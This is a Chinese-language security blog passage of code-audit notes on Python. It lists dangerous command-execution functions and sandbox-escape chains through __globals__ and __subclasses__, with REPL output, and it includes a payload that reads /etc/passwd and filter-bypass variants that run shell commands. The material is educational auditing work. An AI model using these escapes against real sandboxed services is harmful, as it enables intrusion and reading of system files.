class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文库</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="solitude  fas fa-folder-closed"></i><span>全部文章</span></a></li><li><a class="site-page child" href="/categories/"><i class="solitude  fas fa-clone"></i><span>分类列表</span></a></li><li><a class="site-page child" href="/tags/"><i class="solitude  fas fa-tags"></i><span>标签列表</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>我的</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="solitude  fas fa-tools"></i><span>我的装备</span></a></li><li><a class="site-page child" href="/gallery/"><i class="solitude  fas fa-images"></i><span>照片</span></a></li><li><a class="site-page child" href="/music/"><i class="solitude  fas fa-music"></i><span>音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="solitude  fas fa-video"></i><span>追番</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>朋友圈</span></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9zdW1tYXJ5LnpoaGVvLmNvbS9zdGF0aWMvbWF0cml4LXBvc3RzLmh0bWw="><i class="solitude  fas fa-wifi"></i><span>文章矩阵</span></a></li><li><a class="site-page child" href="/links/"><i class="solitude  fas fa-user-group"></i><span>友情链接</span></a></li><li><a class="site-page child" href="javascript:travelling()"><i class="solitude  fas fa-gift"></i><span>宝藏博主</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>其他</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/message/"><i class="solitude  far fa-file-alt"></i><span>留言</span></a></li><li><a class="site-page child" href="/about/"><i class="solitude  fas fa-user"></i><span>关于本站</span></a></li><li><a class="site-page child" href="/privacy/"><i class="solitude  fas fa-user-shield"></i><span>声明</span></a></li></ul></div></div></div><div id="nav-left"></div><div id="nav-right"><div class="nav-button" id="travellings_button"><a class="site-page" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly93d3cudHJhdmVsbGluZ3MuY24vZ28uaHRtbA==" title=""><i class="solitude fas fa-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机一篇文章" href="javascript:void(0);"><i class="solitude fa-solid fa-dice-d6"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索"><i class="solitude fa-solid fa-magnifying-glass"></i></a></div><div class="nav-button" id="nav-console"><a class="console_switchbutton" onclick="sco.showConsole()" title="中控台" href="javascript:void(0);"><label><i class="left"></i><i class="center"></i><i class="right"></i></label></a></div><div id="toggle-menu"><a class="site-page"><i class="solitude fa-solid fa-bars"></i></a></div></div></div></nav><div class="coverdiv" id="coverdiv"><img class="nolazyload" id="post-cover" src="https://w0xking.github.io/picx-images-hosting/战双-(10).7i06bbqn72.jpg" alt="代码审计笔记（Python）"></div><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original" title="该文章为原创文章，注意版权协议">原创</a><span class="post-meta-categories"><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%A1%E8%AE%A1/"><span class="tags-name tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>审计</span></a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"><span class="tags-name tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>代码安全</span></a></div></div></div></div><h1 class="post-title">代码审计笔记（Python）</h1><div id="post-meta"><div class="meta-secondline"><span class="post-meta-date" title="发布于 2022-05-20 14:32:46"><i class="post-meta-icon solitude fas fa-calendar-days"></i><time datetime="2022-05-20T06:32:46.000Z">2022-05-20T06:32:46.000Z</time></span><span class="post-meta-wordcount"><i class="post-meta-icon solitude fa-solid fa-file-word" title="文章字数"></i><span class="word-count">20.3k</span><span class="post-meta-separator"></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content article-container"><div class="post-ai"><div class="ai-title"><div class="ai-title-left"><i class="ai-title-icon solitude fab fa-bilibili"></i><div class="ai-title-text">文章摘要</div></div><div class="ai-tag" id="ai-tag">SkyKing AI</div></div><div class="ai-explanation" style="display: block;"></div><div class="ai-suggestions"></div><div class="ai-bottom"><div class="ai-tips">此内容根据文章生成，并经过人工审核，仅用于文章内容的解释与总结</div><a class="ai-report" title="投诉" href="https://blog.w0xking.us.kg/message/">投诉</a></div></div><p><font color="red">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</font></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="标准库危险模块"><a href="#标准库危险模块" class="headerlink" title="标准库危险模块"></a>标准库危险模块</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">'ifconfig'</span>)</span><br><span class="line">os.popen(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getoutput(<span class="string">'ifconfig'</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">commands.getstatusoutput(<span class="string">'ifconfig'</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">platform.popen(<span class="string">'dir'</span>).read() <span class="comment"># 仅限于python2</span></span><br><span class="line">subprocess.call([<span class="string">'ifconfig'</span>],shell=<span class="literal">True</span>)</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('ifconfig')"</span>,number=<span class="number">1</span>)</span><br><span class="line">sys.call_tracing(<span class="built_in">__import__</span>(<span class="string">'os'</span>).system,(<span class="string">'whoami'</span>,))</span><br></pre></td></tr></tbody></table></figure>

<h4 id="内置危险函数"><a href="#内置危险函数" class="headerlink" title="内置危险函数"></a>内置危险函数</h4><p>在python中,我们知道,不用引入直接使用的内置函数称为 builtin 函数，execfile可以执行任意文本中的python函数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">"import os;os.system('ifconfig')"</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">"__import__('os').system('ifconfig')"</span>);  <span class="comment"># 过滤空格</span></span><br><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>);system(<span class="string">'ls'</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"""__import__('os').system('ifconfig')"""</span>)</span><br><span class="line"><span class="keyword">import</span> os;<span class="built_in">map</span>(os.system,[<span class="string">'ifconfig'</span>])</span><br></pre></td></tr></tbody></table></figure>

<h4 id="globals-模块"><a href="#globals-模块" class="headerlink" title="__globals__模块"></a>__globals__模块</h4><p>该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用__globals__属性访问全局的变量</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(a)</span><br><span class="line">[<span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__closure__'</span>, <span class="string">'__code__'</span>, <span class="string">'__defaults__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__get__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__globals__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__module__'</span>, <span class="string">'__name__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'func_closure'</span>, <span class="string">'func_code'</span>, <span class="string">'func_defaults'</span>, <span class="string">'func_dict'</span>, <span class="string">'func_doc'</span>, <span class="string">'func_globals'</span>, <span class="string">'func_name'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__</span><br><span class="line">{<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'a'</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">'__package__'</span>: <span class="literal">None</span>}</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.func_globals</span><br><span class="line">{<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'a'</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">'__package__'</span>: <span class="literal">None</span>}</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__[<span class="string">'__builtins__'</span>].<span class="built_in">eval</span>(<span class="string">"__import__('os').system('ifconfig')"</span>)</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">10.18</span><span class="number">.69</span><span class="number">.174</span>  netmask <span class="number">255.255</span><span class="number">.248</span><span class="number">.0</span>  broadcast <span class="number">10.18</span><span class="number">.71</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::20c:29ff:fe7d:da26  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:0c:<span class="number">29</span>:7d:da:<span class="number">26</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">16332</span>  <span class="built_in">bytes</span> <span class="number">8119588</span> (<span class="number">7.7</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">1538</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">5406</span>  <span class="built_in">bytes</span> <span class="number">498612</span> (<span class="number">486.9</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>func_globals和 <strong>globals</strong> 作用是一样的，如果过滤了__builtin__中的内容，这样 <strong>globals</strong> 里面的__builtins__也就没有什么意义了，即使重新import <strong>builtin</strong> 还是一样.</p>
<h4 id="Magic-Method（魔术方法）"><a href="#Magic-Method（魔术方法）" class="headerlink" title="Magic Method（魔术方法）"></a>Magic Method（魔术方法）</h4><p>直接输出结论，基于Python2。如果是Python3那么__subclasses__()[xx]中的xx值需要自己找</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 等效于下面语句，但是无法绕过</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>尝试利用继承关系来找到object类</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;,)</span><br></pre></td></tr></tbody></table></figure>
<p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__</span><br><span class="line">{}.__class__.__bases__</span><br></pre></td></tr></tbody></table></figure>
<p>查看可以使用的模块</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakref'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakcallableproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytearray'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytes'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NoneType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NotImplementedType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'traceback'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'super'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'range'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_keys'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_values'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_items'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversekeyiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversevalueiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reverseitemiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'odict_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'set'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'slice'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'staticmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'complex'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'float'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frozenset'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'property'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'managedbuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'memoryview'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'tuple'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'enumerate'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'reversed'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'stderrprinter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'code'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frame'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'builtin_function_or_method'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'function'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'mappingproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'generator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'getset_descriptor'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'wrapper_descriptor'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method-wrapper'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'ellipsis'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'member_descriptor'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'types.SimpleNamespace'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'PyCapsule'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'longrange_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'cell'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'instancemethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'classmethod_descriptor'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method_descriptor'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'callable_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'pickle.PickleBuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'coroutine'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'coroutine_wrapper'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'InterpreterID'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'EncodingMap'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'fieldnameiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'formatteriterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'BaseException'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'hamt'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'hamt_array_node'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'hamt_bitmap_node'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'hamt_collision_node'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'keys'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'values'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'items'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'Context'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'ContextVar'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'Token'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'Token.MISSING'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'moduledef'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'module'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'filter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'map'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'zip'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'classmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.FrozenImporter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ImportLockContext'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_thread._localdummy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_thread._local'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_thread.lock'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_thread.RLock'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_io._IOBase'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_io._BytesIOBuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_io.IncrementalNewlineDecoder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'posix.ScandirIterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'posix.DirEntry'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.WindowsRegistryFinder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._LoaderBasics'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.FileLoader'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._NamespacePath'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._NamespaceLoader'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.PathFinder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.FileFinder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'zipimport.zipimporter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'zipimport._ZipImportResourceReader'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'codecs.Codec'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'codecs.IncrementalEncoder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'codecs.IncrementalDecoder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'codecs.StreamReaderWriter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'codecs.StreamRecoder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_abc._abc_data'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'abc.ABC'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_itemiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Hashable'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Awaitable'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'types.GenericAlias'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.AsyncIterable'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'async_generator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Iterable'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytes_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytearray_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_keyiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_valueiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list_reverseiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'range_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'set_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'str_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'tuple_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Sized'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Container'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Callable'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'os._wrap_close'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_sitebuiltins.Quitter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_sitebuiltins._Printer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_sitebuiltins._Helper'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'types.DynamicClassAttribute'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'types._GeneratorWrapper'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'warnings.WarningMessage'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'warnings.catch_warnings'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.accumulate'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.combinations'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.combinations_with_replacement'</span>&gt;, &lt;<span class="keyword">class</span> <span 